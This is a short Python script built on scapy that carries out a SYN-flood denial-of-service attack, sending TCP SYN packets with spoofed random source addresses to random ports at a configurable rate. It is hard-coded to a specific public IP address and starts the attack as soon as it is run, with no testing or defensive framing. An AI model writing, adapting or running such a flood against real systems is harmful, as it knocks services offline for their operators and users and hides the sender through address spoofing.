
from scapy.all import *
import random
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def perform_ddos_attack(target_ip, packets_per_second):
    try:
        while True:
            # Generate random source IP addresses
            src_ip = ".".join(map(str, (random.randint(0,255) for _ in range(4))))
            
            # Create a packet with random source IP and target IP
            packet = IP(src=src_ip, dst=target_ip) / TCP(dport=random.randint(1, 65535), flags="S")
            
            # Log the source IP and destination port
            logging.info(f"Sending packet from {src_ip} to {target_ip}:{packet[TCP].dport}")
            
            # Send the packet
            send(packet, verbose=False)
            
            # Sleep for the specified time to control the packets per second rate
            time.sleep(1 / packets_per_second)
            
    except KeyboardInterrupt:
        print("DDoS attack interrupted.")

# Example usage:
target_ip = "85.17.65.177"  # Replace with the target IP address
packets_per_second = 1000  # Adjust the packets per second rate as needed

perform_ddos_attack(target_ip, packets_per_second)
